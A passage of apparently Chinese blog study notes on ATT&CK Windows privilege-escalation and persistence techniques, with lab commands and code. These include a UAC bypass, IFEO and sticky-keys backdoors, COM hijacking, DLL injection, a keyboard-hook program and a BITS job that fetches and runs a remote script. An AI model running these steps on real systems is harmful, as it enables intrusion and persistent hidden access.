御与检测：**\n\n试了一下已经会被天擎阻断操作，通过告警也可以看到安装过程会修改程序的注册表，可以主要检测是否在注册表中添加sdb文件，或者是系统日志是否存在调用sdbinst的情况。\n\n![1574854232756](Privilege_Escalation.assets/1574854232756.png)\n\n## Bypass User Account Control-T1088\n\nUAC也就是用户账户控制，它旨在通过将应用程序软件限制为标准用户权限，直到管理员，从而提高Microsoft Windows的安全性。\n\n![1574923401665](Privilege_Escalation.assets/1574923401665.png)\n\n最直观的感受就是在使用administrator权限打开cmd时的这个提示。\n\nBypass UAC的方法是多种多样的，这里直接使用Empire的方式：\n\n首先需要获取一个Empire的普通权限的Agent，在已经获取了Empire的Agent（即shell）时一个普通的 shell通过bypassuac可以绕过UAC的限制，同时还包括了mimikatz\n\n![1574923414857](Privilege_Escalation.assets/1574923414857.png)\n\n现在有两个agents，一个带星号，一个不带星号，带星号的是提权成功的\n\n```\n(Empire: agents) > interact D5193USF\n```\n\n连接D5193USF，在C盘下生成txt会提示没有权限\n\n```\n(Empire: agents) > interact 8VE6CNG2\n```\n\n连接8VE6CNG2，可以直接在C盘下生成\n\n![1574923437930](Privilege_Escalation.assets/1574923437930.png)\n\n成功绕过了UAC的限制生成了1.txt\n\n![1574923448321](Privilege_Escalation.assets/1574923448321.png)\n\n![1574923453459](Privilege_Escalation.assets/1574923453459.png)\n\n## DLL Search Order Hijacking-T1038\n\n从名称可以看到实际上这也就是一种DLL劫持，但是利用的是Windows在加载DLL时搜索顺序，一般情况下会从程序的当前目录搜索，但是也可能从其他路径进行加载。\n\n如果攻击者在将要加载的DLL所在路径之前搜索的路径中放入了同名的恶意DLL，那么恶意DLL将被加载，这种攻击方式叫做DLL预加载攻击。\n\n```\n例：\nTest.exe文件运行时会加载a.dll文件，如果攻击者知道test.exe搜索DLL路径的顺序为：\nC:\\\nC:\\aa\\\nC:\\bb\\\n此时假设a.dll在C:\\aa\\目录下，那此时如果在C:\\下放一个同名的DLL，那么它将在搜索到C:\\aa\\之前被test.exe被加载。\n```\n\n这个技术点同时属于Persistence，不同的应用场景会起到不同的作用，在提权的场景中如果Test.exe在执行时是以管理员权限执行的，则可以进行提权。\n\n## Dylib Hijacking-T1157\n\nMACOS\n\n## Elevated Execution with Prompt-T1514\n\nMACOS\n\n## Emond-T1519\n\nMACOS\n\n## Exploitation for Privilege Escalation-T1068\n\n算是一种思路，并不能算是技术，说的是通过本身已经有了一定权限的应用程序，然后进行提权。\n\n## （未完成）Extra Window Memory Injection-T1181\n\nhttps://modexp.wordpress.com/2018/08/26/process-injection-ctray/\n\n## File System Permissions Weakness-T1044\n\n这里的意思是利用文件权限弱点进行攻击，当一个程序以高权限运行时，通常会加载其他的二进制文件（如DLL文件），而这些DLL文件的权限设置不正确，可能会被修改，加入使用其他的DLL来替换原本应该被执行的DLL，则恶意DLL会被以高权限执行。\n\n比如之前的VPN的提权漏洞，DLL文件的可写权限为Everyone（关键点），而主程序的执行权限为System，当创建一个DLL文件进行替换原文件时，恶意的DLL文件会以system权限执行。实际上和T1038的DLL Search Order Hijacking在原理上也是有一定的相似的。\n\n## Hooking-T1179\n\n类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性。\n\n这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：\n\n```\n1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。\n2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。\n```\n\n应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。\n\n![1574865422847](Privilege_Escalation.assets/1574865422847.png)\n\n从上图可以更形象的来理解这个过程。\n\n下面直接利用原书中的示例代码来进行实验，通过编写的钩子（HOOK）文件来拦截notepad.exe的输入：\n\n首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:\n\n```\n#include \"stdio.h\"\n#include \"conio.h\"\n#include \"windows.h\"\n\n#define\tDEF_DLL_NAME\t\t\"KeyHook.dll\"\n#define\tDEF_HOOKSTART\t\t\"HookStart\"\n#define\tDEF_HOOKSTOP\t\t\"HookStop\"\n\ntypedef void (*PFN_HOOKSTART)();\ntypedef void (*PFN_HOOKSTOP)();\n\nvoid main()\n{\n\tHMODULE\t\t\thDll = NULL;\n\tPFN_HOOKSTART\tHookStart = NULL;\n\tPFN_HOOKSTOP\tHookStop = NULL;\n\tchar\t\t\tch = 0;\n\n\thDll = LoadLibraryA(DEF_DLL_NAME);\n    if( hDll == NULL )\n    {\n        printf(\"LoadLibrary(%s) failed!!! [%d]\", DEF_DLL_NAME, GetLastError());\n        return;\n    }\n\n\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\n\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);\n\tHookStart();\n\tprintf(\"press 'q' to quit!\\n\");\n\twhile( _getch() != 'q' )\t;\n\tHookStop();\n\tFreeLibrary(hDll);\n}\n```\n\n然后生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:\n\n```\n#include \"stdio.h\"\n#include \"windows.h\"\n\n#define DEF_PROCESS_NAME\t\t\"notepad.exe\"\n\nHINSTANCE g_hInstance = NULL;\nHHOOK g_hHook = NULL;\nHWND g_hWnd = NULL;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n{\n\tswitch( dwReason )\n\t{\n        case DLL_PROCESS_ATTACH:\n\t\t\tg_hInstance = hinstDLL;\n\t\t\tbreak;\n        case DLL_PROCESS_DETACH:\n\t\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)\n{\n\tchar szPath[MAX_PATH] = {0,};\n\tchar *p = NULL;\n\tif( nCode >= 0 )\n\t{\n\t\tif( !(lParam & 0x80000000) )\n\t\t{\n\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\n\t\t\tp = strrchr(szPath, '\\\\');\n\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME) )\n\t\t\t\treturn 1;\n\t\t}\n\t}\n\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n}\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\t__declspec(dllexport) void HookStart()\n\t{\n\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\n\t}\n\t__declspec(dllexport) void HookStop()\n\t{\n\t\tif( g_hHook )\n\t\t{\n\t\t\tUnhookWindowsHookEx(g_hHook);\n\t\t\tg_hHook = NULL;\n\t\t}\n\t}\n#ifdef __cplusplus\n}\n#endif\n```\n\n将代码编译成对应的exe和dll文件之后我们进行测试。\n\n首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer查看发现此时notepad.exe还没有调用Keyhook.dll\n\n![1574865501933](Privilege_Escalation.assets/1574865501933.png)\n\n在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。\n\n![1574865521455](Privilege_Escalation.assets/1574865521455.png)\n\n这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。\n\n这个技术点在Persistence和Privilege Escalation都有，但是感觉好像更适合权限维持。\n\n## Image File Execution Options Injection\n\nImage File Execution Options Injection简称IFEO（映像劫持），使开发人员可以将调试器附加到应用程序。比如将cmd.exe设置为notepad.exe调试器，在执行notepad.exe时，实际上执行的是cmd.exe（上可以设置开启启动，也可以设置关闭时启动等）。\n\n演示的方式很简单，直接修改注册表：\n\n```\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /d \"cmd.exe\"\n```\n\n![1574865572322](Privilege_Escalation.assets/1574865572322.png)\n\n可以看到运行notepad.exe的时候cmd.exe被执行了。此时如果执行的某程序（这里是notepad.exe）\n\n## New Service-T1050\n\nNew Service也就是新的服务，实际上和Execution中的Service Execution-T1035差不多，但是文章中提到通过创建服务将权限从管理员升级到System，但是感觉好像没有这个必要吧？\n\n## 未完成Parent PID Spoofing-T1502\n\n父进程PID欺骗，一个进程通常直接从父进程或者调用进程中产生。而这种技术通过修改父进程来进行提权和检测绕过。\n\n\n\n参考链接：https://blog.f-secure.com/detecting-parent-pid-spoofing/\n\n## Path Interception-T1034\n\n主要是说类似于可信任服务路径漏洞的一些情况，比如当一个程序使用了CreateProcess函数，并且没有正确的对CreateProcess函数中的第二个参数进行添加双引号，并且这个程序加载的二进制文件（也或者是安装目录，因为一般加载的文件都是在安装目录下）还存在空格，那么这个程序就可能存在这一漏洞。\n\n其中powershell脚本工具Powerup就能够搜索系统中可能存在此类漏洞的程序。可信任服务路径漏洞的原理：\n\n![1574866555386](Privilege_Escalation.assets/1574866555386.png)\n\n之前找到过这样的软件的漏洞，复现直接跳过了。\n\n## Plist Modification\n\nMACOS\n\n## 未完成/Port Monitors\n\n可以通过系统API来设置端口监视器，设置在对应端口启动时会加载的DLL。\n\n## PowerShell Profile-T1504\n\nPowerShell Profile就是Powershell的配置文件（profile.ps1），是一个Powershell在启动时会自动运行的脚本。\n\n可以使用命令查看：\n\n```\necho $profile\n```\n\n![1575364230270](Privilege_Escalation.assets/1575364230270.png)\n\n```\n判断路径是否存在\nTest-Path $profile\n```\n\n![1575364366615](Privilege_Escalation.assets/1575364366615.png)\n\n这里已经创建过一次，所以现在提示为true\n\n使用powershell命令在对应的profile文件中插入命令（这里插入的是Start-Process calc.exe）\n\n```\nNew-Item -Path $profile -Type File –Force\n$string = 'Start-Process calc.exe'\n$string | Out-File -FilePath $profile -Append\n```\n\n再次打开Powershell.exe时会弹出计算器。\n\n![1575364807553](Privilege_Escalation.assets/1575364807553.png)\n\n## Process Injection-T1055\n\n进程注入指的是在活动进程的地址空间中执行任意代码的方法。比如说在powershell.exe进程或者是notepad.exe进程中执行任意代码。\n\n这里使用的是Powersploit中的Invoke-DllInjection.ps1工具：\n\n```\n. .\\Invoke-DllInjection.ps1\nInvoke-DllInjection -ProcessID 896 C:\\Users\\Administrator\\Desktop\\fortest.dll\n```\n\n![1575365764159](Privilege_Escalation.assets/1575365764159.png)\n\n执行完成之后看到弹窗，并且是和notepad还是一个窗口\n\n![1575365810943](Privilege_Escalation.assets/1575365810943.png)\n\n参考链接：\n\nhttps://pentestlab.blog/2017/04/04/dll-injection/\n\n## 未完成Scheduled Task-T1053\n\n参考执行篇，执行篇也没搞\n\n## 未完成Service Registry Permissions Weakness-T1058\n\nWindows将本地服务配置信息存储在注册表中的下HKLM\\SYSTEM\\CurrentControlSet\\Services。可以通过服务控制器，sc.exe，PowerShell或Reg等工具来操纵存储在服务的注册表项下的信息，以修改服务的执行参数。通过访问控制列表和权限控制对注册表项的访问。\n\n## 未完成SIP and Trust Provider Hijacking-T1198\n\n参照Persistence篇\n\n## SID-History Injection-T1178\n\n \n\n## Sudo-T1169\n\n \n\n## Sudo Caching-T1206\n\n \n\n## Valid Accounts-T1078\n\n有效账户。。。？认为是一种思路，而非具体的技术，就是说有了现在系统上已经存在的有效账户的凭据等等，来维持权限。\n\n## Webshell-T1100\n\nWebshell？","categories":["ATT&CK"]},{"title":"ATT&CK_Persistence","url":"/2020/12-18-ATT&CK_Persistence/","content":"\n## Accessibility Features-T1015\n\nWindows包含可访问性功能，这些功能可以在用户登录之前（例如，当用户在Windows登录屏幕上时）通过组合键启动。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门程序，而无需登录系统。比如shift后门，通过五次shift按键调用C:\\Windows\\System32\\sethc.exe。\n\n通过命令修改sethc文件为cmd文件。\n\n```\ncopy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.exe\n```\n\n![1574767433351](Persistence.assets/1574767433351.png)\n\n在桌面锁定的时候按下五次shift即可在没有进入桌面的情况下调用cmd\n\n![1574767481596](Persistence.assets/1574767481596.png)\n\n```\n其他类似的功能还有\n屏幕键盘： C:\\Windows\\System32\\osk.exe\n放大镜： C:\\Windows\\System32\\Magnify.exe\n旁白： C:\\Windows\\System32\\Narrator.exe\n显示切换器： C:\\Windows\\System32\\DisplaySwitch.exe\nApp切换器： C:\\Windows\\System32\\AtBroker.exe\n```\n\n## Account Manipulation\n\n账户操作是说通过修改一些低权限的账户的权限，来达到权限维持的目的。一般情况下我们可能会将某个用户添加到特定的管理员组，实际上还有一种更加隐蔽的方法是添加DACL权限，原文中并未提到，通过添加DACL权限几乎可以将任意权限赋予特定账户。后续会有文章单独说一下这一点。\n\n## AppCert DLLs-T1182\n\n如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会读取注册表项：\n\n```\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SessionManager\\AppCertDlls\n```\n\n此项下的dll都会加载到此进程。（Win7下默认没有此项）\n\n![1574767636462](Persistence.assets/1574767636462.png)\n\n首先创建这个注册表项\n\n![1574767651518](Persistence.assets/1574767651518.png)\n\n指向一个DLL文件，这个DLL文件会使用MessageBox弹出一个对话框，C++代码为：\n\n```c++\n// mydll.cpp : Defines the entry point for the DLL application.\n//\n#!c\n#include \"stdafx.h\"\n#include \"Windows.h\"\nBOOL APIENTRY DllMain( HANDLE hModule, \n                       DWORD  ul_reason_for_call, \n                       LPVOID lpReserved\n\t\t\t\t\t )\n{\n\tMessageBox(NULL, \"testAppCert DLLs\", \"attack\", MB_OK| MB_ICONEXCLAMATION);\n    return TRUE;\n}\n```\n\n然后创建一个程序，使用CreateProcess创建进程，这里的代码含义为使用CreateProcess执行一个cmd命令，代码为（这里是直接使用的MSDN上给出的示例https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-processes）：\n\n```c++\n#include <windows.h>\n#include <stdio.h>\n#include <tchar.h>\n\nvoid _tmain( int argc, TCHAR *argv[] )\n{\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory( &si, sizeof(si) );\n    si.cb = sizeof(si);\n    ZeroMemory( &pi, sizeof(pi) );\n    if( argc != 2 )\n    {\n        printf(\"Usage: %s [cmdline]\\n\", argv[0]);\n        return;\n    }\n    // Start the child process. \n    if( !CreateProcess( NULL,   // No module name (use command line)\n        argv[1],        // Command line\n        NULL,           // Process handle not inheritable\n        NULL,           // Thread handle not inheritable\n        FALSE,          // Set handle inheritance to FALSE\n        0,              // No creation flags\n        NULL,           // Use parent's environment block\n        NULL,           // Use parent's starting directory \n        &si,            // Pointer to STARTUPINFO structure\n        &pi )           // Pointer to PROCESS_INFORMATION structure\n    ) \n    {\n        printf( \"CreateProcess failed (%d).\\n\", GetLastError() );\n        return;\n    }\n    // Wait until child process exits.\n    WaitForSingleObject( pi.hProcess, INFINITE );\n    // Close process and thread handles. \n    CloseHandle( pi.hProcess );\n    CloseHandle( pi.hThread );\n}\n```\n\n此时编译出了两个文件，一个exe，一个DLL\n\n![1574767762498](Persistence.assets/1574767762498.png)\n\n执行TestCreateProcess.exe运行calc.exe（此时），可以看到dll已经被调用：\n\n![1574767845396](Persistence.assets/1574767845396.png)\n\n## AppInit DLLs-T1103\n\n当User32.dll被调用时，会获取AppInit DLLs注册表项，如果有值，则会通过LoadLibrary()API加载，不使用User32.dll的程序是不需要加载这个注册表项的。（https://support.microsoft.com/en-us/help/197571/working-with-the-appinit-dlls-registry-value）\n\n注册表位置：\n\n```\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n```\n\n![1574853484727](Persistence.assets/1574853484727.png)\n\n使用和上一个AppCert相同的dll，也就是mydll.dll，同时LoadAPPInit_DLLS需要设置为1。\n\n![1574853497124](Persistence.assets/1574853497124.png)\n\n这个在设置完了发现需要重启之后才能生效，重启之后发现开机自动被调用（忽略MessageBox中的名称，这里用的是AppCert Dlls实验中的dll）\n\n![1574853537829](Persistence.assets/1574853537829.png)\n\n通过Process Explorer可以看到Chrome浏览器和搜狗拼音输入法都会自动调用User32.dll从而加载AppInit DLLs注册表中的c:\\mydll.dll\n\n![1574853575466](Persistence.assets/1574853575466.png)\n\n同时cmd.exe也会调用User32.dll。是一个需要重点关注的注册表项。需要检测AppInit DLLs注册表动态，是否存在被修改的情况，同时可以通过APPLocker进行设置白名单，禁止通过AppInit DLLs调用dll。\n\n## Application Shimming-T1138\n\nShims可用于在较新的环境中支持旧API，或在旧环境中支持新API。在计算机编程，一个Shims是一个小型数据库，是透明的拦截API调用和改变传递的参数，处理操作本身或把操作重定向到其他地方。\n\n例如，Application Shimming应用程序允许开发人员将为WindowsXP创建的应用程序所写的修复在无需重写代码的情况下用于Win10。\n\n​    Shim架构实现了一种API钩子，而windows API是通过一组DLL来实现的，windows系统上的每个应用程序导入这些DLL，并在内存中维护一个存储调用函数地址的表。\n\n我们可以通过sdbinst工具将自定义的sdb数据库文件部署到计算机中，部署并注册数据库文件之后操作系统会在启动应用程序时启用兼容性修补程序。\n\n首先生成了一个DLL文件用于测试，代码和APPCertdlls的一样，通过MessageBox弹一个窗。然后安装ApplicationCompatibilityToolkit工具（可参考https://support.microsoft.com/en-us/help/317510/how-to-use-the-compatibility-administrator-utility-in-windows），安装完成后通过命令行打开：\n\n![1574853661528](Persistence.assets/1574853661528.png)\n\n打开之后创建fix：\n\n![1574854033613](Persistence.assets/1574854033613.png)\n\n选择InjectDll：\n\n![1574854044950](Persistence.assets/1574854044950.png)\n\n设置希望被加载的dll路径：\n\n![1574854066800](Persistence.assets/1574854066800.png)\n\n然后确定下一步完成：\n\n![1574854077679](Persistence.assets/1574854077679.png)\n\n现在保存这个数据库名称：\n\n![1574854087986](Persistence.assets/1574854087986.png)\n\n保存之后会产生一个名为testShim.sdb的文件，此时执行还需要将sdb安装到系统的Shim库中\n\n![1574854099518](Persistence.assets/1574854099518.png)\n\n可以通过ApplicationCompatibilityToolkit直接安装，也可以通过sdbinst.exe进行安装（系统自带，可以直接运行）\n\n![1574854143247](Persistence.assets/1574854143247.png)\n\n![1574854148771](Persistence.assets/1574854148771.png)\n\n安装完成之后可以看到已经安装的testShim：\n\n![1574854159357](Persistence.assets/1574854159357.png)\n\n此时运行putty时dll被加载：\n\n![1574854180686](Persistence.assets/1574854180686.png)\n\n需要卸载的话也可以使用sdbinst.exe进行卸载：\n\n![1574854193712](Persistence.assets/1574854193712.png)\n\n**防御与检测：**\n\n试了一下已经会被天擎阻断操作，通过告警也可以看到安装过程会修改程序的注册表，可以主要检测是否在注册表中添加sdb文件，或者是系统日志是否存在调用sdbinst的情况。\n\n![1574854232756](Persistence.assets/1574854232756.png)\n\n## 未完成Authentication Package\n\nWindows身份验证包DLL在系统启动时由本地安全机构（LSA）进程加载。它们为操作系统的多个登录过程和多个安全协议提供支持。\n\n目标注册表地址：\n\n```\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\n```\n\n将fortest.dll放入System32路径下\n\n![1574863538831](Persistence.assets/1574863538831.png)\n\n然后再注册表中插入，但是不知道什么原因并没有调用成功\n\n![1574863566326](Persistence.assets/1574863566326.png)\n\n用proces Explorer没有找到相关的dll加载，后面再看这个问题了。\n\n![1574863580976](Persistence.assets/1574863580976.png)\n\n## BITS Jobs\n\nBITS，后台智能传输服务，是一个 Windows 组件，它可以利用空闲的带宽在前台或后台异步传输文件，例如，当应用程序使用80%的可用带宽时，BITS将只使用剩下的20%。不影响其他网络应用程序的传输速度，并支持在重新启动计算机或重新建立网络连接之后自动恢复文件传输。\n\n这里使用的是三好学生的一个测试用例：\n\n```\n#创建一个bitsadmin会话\nbitsadmin /create backdoor\n\nbitsadmin /addfile backdoor %comspec%  %temp%\\cmd.exe\nbitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe \"/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll\"\nbitsadmin /Resume backdoor\n```\n\n运行之后每隔一段时间calc.exe会被执行\n\n![1574863632422](Persistence.assets/1574863632422.png)\n\n关于Bitsadmin的操作可以参考：\n\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples\n\n## Bootkit\n\nBootkit是一种更高级的Rootkit，安全的对抗首先在权限方面，权限高的进程对权限低的权限就是就是降维打击，无往不利。当权限相同时，启动得早便为王。所谓的bootkit也就是基于这个思路设计的一种复杂病毒。它优先于Windows系统启动，自然也就优先于杀毒软件启动的时间。（这个不是很懂，就没研究）\n\n## Browser Extensions\n\n通过在浏览器中植入恶意代码（后门）进行控制，Chrome之前就爆出过类似的带有后门的插件。\n\n## 未完成Change Default File Association\n\n修改一些程序默认的加载项？\n\n## Component Firmware\n\n一些攻击者可能会采用复杂的手段来破坏计算机组件并安装恶意固件，这些恶意固件将在操作系统和主系统固件或BIOS之外执行攻击者代码。感觉更像一个思路吧，相关的技术没有跟。\n\n## Component Object Model Hijacking\n\n### COM组件\n\nCOM组件劫持，COM是Component Object Model （组件对象模型）的缩写，COM组件由DLL和EXE形式发布的可执行代码所组成。\n\n​    CLSID是标识COM类对象的全局唯一标识符。每一个CLSID代表着一个COM组件，CLSID的算法思路是结合机器的网卡、时间、和一个随机数来生成GUID，微软的COM中GUID和UUID和CLSID、SID差不多，各自代表的含义不同：\n\n```\nUUID：代表COM\nCLSID：代表COM组件中的类\nIID：代表Com组件中的接口\n```\n\nPython也有能直接生成GUID的库\n\n```\n>>> import pythoncom\n>>> print(pythoncom.CreateGuid())\n{DE6F358D-A750-49D5-9217-196E05B3E2AE}\n```\n\n**COM组件与注册表之间的关系**\n\nCom组件编写好了之后（一般用C++编写），然后需要注册到注册表中，这样在调用这个COM组件的功能的时候程序会进注册表进行读取相应位置的DLL或者EXE，加载到进程中使用。\n\n在学习COM组件编写的时候遇到一句话感觉很形象：C语言的接口就是函数，C++的接口就是类的成员函数，而COM接口就是一些纯虚函数的集合。\n\n### 最简单的COM劫持\n\n首先通过命令添加注册表项：\n\n```\nSET KEY=HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InProcServer32\nREG.EXE ADD %KEY% /VE /T REG_SZ /D \"C:\\fortest.dll\" /F\nREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F\n```\n\n![1574865134277](Persistence.assets/1574865134277.png)\n\n然后输入命令（SET设置环境变量，但是只作用于当前cmd.exe）：\n\n```\nSET COR_ENABLE_PROFILING=1\nSET COR_PROFILER={11111111-1111-1111-1111-111111111111}\n```\n\n细节可参考\n\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/set_1\n\nhttps://www.robvanderwoude.com/ntset.php\n\n![1574865186423](Persistence.assets/1574865186423.png)\n\n再执行能够调用.NET的命令即可触发DLL实现弹窗（因为实验DLL为32位，所以在64位系统上执行此操作会失败）。\n\n![1574865200576](Persistence.assets/1574865200576.png)\n\n如果想要不用每次都执行SET设置当前cmd的环境变量，可以使用WMIC更改环境变量，但是需要重启或者注销之后重新登录。\n\n```\nwmic ENVIRONMENT create name=\"COR_ENABLE_PROFILING\",username=\"%username%\",VariableValue=\"1\"\nwmic ENVIRONMENT create name=\"COR_PROFILER\",username=\"%username%\",VariableValue=\"{11111111-1111-1111-1111-111111111111}\"\n```\n\n在一个新打开的cmd中使用set查看当前环境变量已经能够看到对应的CLSID值。\n\n![1574865237444](Persistence.assets/1574865237444.png)\n\n## Create Account\n\n创建本地账户，但是这样的话实际上很容易被发现，优点就是不需要任何工具辅助。\n\n## DLL Search Order Hijacking-T1038\n\n从名称可以看到实际上这也就是一种DLL劫持，但是利用的是Windows在加载DLL时搜索顺序，一般情况下会从程序的当前目录搜索，但是也可能从其他路径进行加载。\n\n如果攻击者在将要加载的DLL所在路径之前搜索的路径中放入了同名的恶意DLL，那么恶意DLL将被加载，这种攻击方式叫做DLL预加载攻击。\n\n```\n例：\nTest.exe文件运行时会加载a.dll文件，如果攻击者知道test.exe搜索DLL路径的顺序为：\nC:\\\nC:\\aa\\\nC:\\bb\\\n此时假设a.dll在C:\\aa\\目录下，那此时如果在C:\\下放一个同名的DLL，那么它将在搜索到C:\\aa\\之前被test.exe被加载。\n```\n\n## Dylib Hijacking-T1157\n\nMACOS\n\n## External Remote Services\n\n直接翻译的话就是“外部远程服务”，个人认为可以算一种思路，但是不算一种具体的技术，主要是说通过VPN或者其他的访问机制等使用户可以从外部位置连接到内部企业网络资源。其中还提到了WINRM。\n\n## File System Permissions Weakness-T1044\n\n这里的意思是利用文件权限弱点进行攻击，实际上提权中用到的这种方法会更多。当一个程序以高权限运行时，通常会加载其他的二进制文件（如DLL文件），而这些DLL文件的权限设置不正确，可能会被修改，加入使用其他的DLL来替换原本应该被执行的DLL，则恶意DLL会被以高权限执行。\n\n比如之前的VPN的提权漏洞，DLL文件的可写权限为Everyone（关键点），而主程序的执行权限为System，当创建一个DLL文件进行替换原文件时，恶意的DLL文件会以system权限执行。\n\n## Hidden Files and Directories\n\n是指通过设置或者是attrib.exe隐藏二进制文件或者是其他的文件，在Linux、MACOS、Windows平台上都有此类型功能。\n\n## Hooking-T1179\n\n类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性。\n\n这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：\n\n1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。\n\n2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。\n\n应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。\n\n![1574865422847](Persistence.assets/1574865422847.png)\n\n从上图可以更形象的来理解这个过程。\n\n下面直接利用原书中的示例代码来进行实验，我们通过编写的钩子（HOOK）文件来拦截notepad.exe的输入：\n\n首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:\n\n```\n#include \"stdio.h\"\n#include \"conio.h\"\n#include \"windows.h\"\n\n#define\tDEF_DLL_NAME\t\t\"KeyHook.dll\"\n#define\tDEF_HOOKSTART\t\t\"HookStart\"\n#define\tDEF_HOOKSTOP\t\t\"HookStop\"\n\ntypedef void (*PFN_HOOKSTART)();\ntypedef void (*PFN_HOOKSTOP)();\n\nvoid main()\n{\n\tHMODULE\t\t\thDll = NULL;\n\tPFN_HOOKSTART\tHookStart = NULL;\n\tPFN_HOOKSTOP\tHookStop = NULL;\n\tchar\t\t\tch = 0;\n\n\thDll = LoadLibraryA(DEF_DLL_NAME);\n    if( hDll == NULL )\n    {\n        printf(\"LoadLibrary(%s) failed!!! [%d]\", DEF_DLL_NAME, GetLastError());\n        return;\n    }\n\n\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\n\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);\n\tHookStart();\n\tprintf(\"press 'q' to quit!\\n\");\n\twhile( _getch() != 'q' )\t;\n\tHookStop();\n\tFreeLibrary(hDll);\n}\n```\n\n然后生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:\n\n```\n#include \"stdio.h\"\n#include \"windows.h\"\n\n#define DEF_PROCESS_NAME\t\t\"notepad.exe\"\n\nHINSTANCE g_hInstance = NULL;\nHHOOK g_hHook = NULL;\nHWND g_hWnd = NULL;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n{\n\tswitch( dwReason )\n\t{\n        case DLL_PROCESS_ATTACH:\n\t\t\tg_hInstance = hinstDLL;\n\t\t\tbreak;\n        case DLL_PROCESS_DETACH:\n\t\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)\n{\n\tchar szPath[MAX_PATH] = {0,};\n\tchar *p = NULL;\n\tif( nCode >= 0 )\n\t{\n\t\tif( !(lParam & 0x80000000) )\n\t\t{\n\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\n\t\t\tp = strrchr(szPath, '\\\\');\n\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME) )\n\t\t\t\treturn 1;\n\t\t}\n\t}\n\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n}\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\t__declspec(dllexport) void HookStart()\n\t{\n\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\n\t}\n\t__declspec(dllexport) void HookStop()\n\t{\n\t\tif( g_hHook )\n\t\t{\n\t\t\tUnhookWindowsHookEx(g_hHook);\n\t\t\tg_hHook = NULL;\n\t\t}\n\t}\n#ifdef 